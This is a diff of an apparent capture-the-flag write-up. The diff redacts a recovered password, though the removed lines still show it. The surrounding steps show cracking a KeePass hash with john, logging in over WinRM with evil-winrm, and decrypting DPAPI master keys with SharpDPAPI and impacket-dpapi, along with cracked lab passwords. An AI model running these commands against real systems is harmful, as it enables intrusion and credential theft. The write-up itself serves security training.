@@ -33,6 +33,7 @@ john --wordlist=rockyou.txt keepass.hash
 ```
 
 The recovered credentials are:
+
 - Adam (adam.silver): `HJKL2025!`
 - Anthony (ant.edwards): `Antman2025!`
 - Jamie: `JamieLove2025!`
@@ -93,6 +94,7 @@ Back in BloodHound, we identify two more interesting accounts in the Puppy Admin
 ### Step 9: Password Pattern Analysis
 
 Based on the password pattern we've seen (`Name2025!`), we try common variations:
+
 - `Stephen2025!` - No success
 - `Steph2025!` - No success
 
@@ -101,7 +103,7 @@ Based on the password pattern we've seen (`Name2025!`), we try common variations
 In the `C:\Backups` directory, we find and download `site-backup-2024-12-30.zip`. Inside the archive, we discover `nms-auth-config.xml.bak` which contains credentials for steph.cooper:
 
 ```
-Password: ChefSteph2025!
+Password: [REDACTED]
 ```
 
 ### Step 11: Connecting as Steph Cooper
@@ -109,7 +111,7 @@ Password: ChefSteph2025!
 We connect with steph's credentials via WinRM:
 
 ```bash
-evil-winrm -i 10.129.232.75 -u steph.cooper -p ChefSteph2025!
+evil-winrm -i 10.129.232.75 -u steph.cooper -p [REDACTED]
 ```
 
 Running WinPEAS and PowerView/PowerUp doesn't reveal any obvious privilege escalation vectors.
@@ -137,7 +139,7 @@ MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
 We attempt to decrypt the credentials using SharpDPAPI and DPAPISnoop, but encounter CryptProtectData errors:
 
 ```powershell
-.\SharpDPAPI.exe triage /password:ChefSteph2025!
+.\SharpDPAPI.exe triage /password:[REDACTED]
 .\DPAPISnoop.exe
 ```
 
@@ -182,7 +184,7 @@ Using impacket-dpapi, we decrypt the master key with Steph's password:
 ```bash
 impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
   -sid S-1-5-21-1487982659-1829050783-2281216199-1107 \
-  -password 'ChefSteph2025!'
+  -password '[REDACTED]'
 ```
 
 This outputs the decrypted master key.
